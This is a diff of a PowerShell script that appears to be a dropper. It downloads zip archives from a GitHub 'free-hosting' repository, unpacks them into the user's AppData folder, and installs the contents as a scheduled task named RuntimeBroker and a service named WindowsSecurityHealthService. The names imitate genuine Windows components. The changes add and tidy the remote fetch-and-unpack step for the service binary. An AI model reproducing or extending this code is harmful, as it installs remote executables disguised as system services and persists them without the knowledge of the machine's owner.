@@ -119,8 +119,10 @@ if (Test-Path -Path $currentDir) {
 # Set the target directory and AppData path
 $appDataPath = "C:\Users\$currentUserName\AppData"
 $currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
-$currentDirService = "$appDataPath\Local\Microsoft\WindowsSecurityHealth"
+$currentDirService = "$appDataPath\Local\Microsoft"
 $taskExecutablePath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"
+# Path to the executable file of the service
+$servicePath = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe"
 
 # Variables for task name and task path
 $taskName = 'RuntimeBroker'
@@ -189,12 +191,14 @@ $unzipDir = $currentDir
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
 Expand-Archive -Path $zipFile -DestinationPath $unzipDir
 
-$zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
-$zipFileService = "$currentDir\service.zip"
-$unzipDirService = $currentDir
+if (-not (Test-Path -Path $servicePath)) {
+    $zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/service.zip"
+    $zipFileService = "$currentDirService\service.zip"
+    $unzipDirService = $currentDirService
 
-Invoke-WebRequest -Uri $$zipUrlService -OutFile $zipFileService
-Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService
+    Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
+    Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService
+}
 
 # 3. Delete the appsettings.xml file if it exists and terminate any processes using the files in the directory
 $appSettingsPath = "$appDataPath\Local\Microsoft\appsettings.xml"
@@ -244,9 +248,6 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 }
 
 # 6. Create service
-
-# Path to the executable file of the service
-$servicePath = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe"
 
 # Service name
 $serviceName = "WindowsSecurityHealthService"
